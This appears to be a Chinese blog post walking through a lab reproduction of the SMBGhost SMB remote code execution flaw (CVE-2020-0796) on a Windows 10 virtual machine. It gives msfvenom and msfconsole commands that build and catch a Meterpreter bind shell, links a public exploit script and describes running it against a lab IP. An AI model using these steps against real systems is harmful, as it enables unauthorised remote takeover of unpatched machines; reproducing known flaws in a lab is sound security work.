---
title: 漏洞复现-SMB远程代码执行漏洞（CVE-2020-0796）
tags: 
  - SMB
  - 系统安全
  - 远程代码执行
categories: 漏洞复现
keywords: '系统安全,SMB,远程代码执行,漏洞复现'
description: 漏洞复现-SMB远程代码执行漏洞（CVE-2020-0796）.md
cover: https://img2.baidu.com/it/u=207705934,1439123695&fm=26&fmt=auto&gp=0.jpg
date: 2021-07-02 22:45:41
---

<meta name="referrer" content="no-referrer"/>

## 环境搭建

虚拟机wmware
Windows10
下载地址：
迅雷下载 ：
ed2k://|file|cn_windows_10_business_editions_version_1903_x64_dvd_e001dd2c.iso|4815527936|47D4C57E638DF8BF74C59261E2CE702D|

## 漏洞概述
SMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。
攻击者利用该漏洞无须权限即可实现远程代码执行，受黑客攻击的目标系统只需开机在线即可能被入侵。
该漏洞的后果十分接近永恒之蓝系列，都利用Windows SMB漏洞远程攻击获取系统最高权限，WannaCry勒索蠕虫就是利用永恒之蓝系列漏洞攻击工具制造的大灾难。除了直接攻击SMB服务端造成RCE外，该漏洞得亮点在于对SMB客户端的攻击，攻击者可以构造特定的网页，压缩包，共享目录，OFFICE文档等多种方式触发漏洞进行攻击。
## 漏洞影响
漏洞不影响win7，漏洞影响Windows 10 1903之后的各个32位、64位版Windows，包括家用版、专业版、企业版、教育版。
Windows 10 Version 1903 for 32-bit Systems
Windows 10 Version 1903 for x64-based Systems
Windows 10 Version 1903 for ARM64-based Systems
Windows Server, Version 1903 (Server Core installation)
Windows 10 Version 1909 for 32-bit Systems
Windows 10 Version 1909 for x64-based Systems
Windows 10 Version 1909 for ARM64-based Systems
Windows Server, Version 1909 (Server Core installation)
## 漏洞检测
#### 测试是否能ping通靶机
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334566921-50d4d448-988a-485c-a60f-e55470131666.png)
如果ping不通，可能情况是靶机开启了防护墙Windows defender，可以手动进行关闭
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334567523-b4c59e2c-b836-42e7-bba5-a8b2250d1bac.png#align=left&display=inline&height=234&margin=%5Bobject%2Object%5D&originHeight=888&originWidth=1578&status=done&style=none&width=415)

#### 检测漏洞存在
使用exp检测漏洞存在
下载地址：
[http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip](http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip)
使用方法：
下载后使用CVE-2020-0796-Scanner.exe，输入ip地址即可
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334567969-a968efd6-ec6e-4098-8450-253287c8347d.png#align=left&display=inline&height=59&margin=%5Bobject%2Object%5D&originHeight=170&originWidth=1196&status=done&style=none&width=415)
## 漏洞利用
1、通过 MSF 生成 shellcode：
msfvenom -p windows/x64/meterpreter/bind_tcp lport=9999 -f py -o shellcode.txt
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334568518-bf92759e-47dc-4baf-aa81-34b93d062fb5.png#align=left&display=inline&height=199&margin=%5Bobject%2Object%5D&originHeight=434&originWidth=904&status=done&style=none&width=415)
2、通过exp利用脚本利用shellcode
下载地址：
[https://github.com/chompie1337/SMBGhost_RCE_PoC.git](https://github.com/chompie1337/SMBGhost_RCE_PoC.git)
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334569014-643b6bf8-1e45-4460-b2ca-73a429003a20.png#align=left&display=inline&height=135&margin=%5Bobject%2Object%5D&originHeight=274&originWidth=840&status=done&style=none&width=415)
3、将生成的shellcode的内容中的buf替换成USER_PAYLOAD

![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334569620-761f2972-b589-41e2-a758-254b9602efd6.png#align=left&display=inline&height=193&margin=%5Bobject%2Object%5D&originHeight=880&originWidth=1891&status=done&style=none&width=415)
4、替换exploit.py中的USER_PAYLOAD的内容
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334570095-2198b1d8-4fc8-4ca7-a05b-51586636e251.png#align=left&display=inline&height=199&margin=%5Bobject%2Object%5D&originHeight=918&originWidth=1920&status=done&style=none&width=416)
5、msf开启监听
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set lport 9999
set rhost 192.168.229.166
exploit
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334570644-dbf6a715-ac0b-4bf2-9829-d1d26e4abd67.png#align=left&display=inline&height=120&margin=%5Bobject%2Object%5D&originHeight=203&originWidth=703&status=done&style=none&width=415)
6、在靶机执行exploit.py脚本
python3 exploit.py -ip 192.168.229.166
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334570993-a6fdfee2-18d7-459b-9c7b-258055be8e28.png#align=left&display=inline&height=58&margin=%5Bobject%2Object%5D&originHeight=96&originWidth=531&status=done&style=none&width=319)
然后，成功蓝屏。。。
![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334571514-1b5042a8-4fd1-40b2-a3fa-6ff187bcfc6b.png#align=left&display=inline&height=288&margin=%5Bobject%2Object%5D&originHeight=480&originWidth=640&status=done&style=none&width=384)
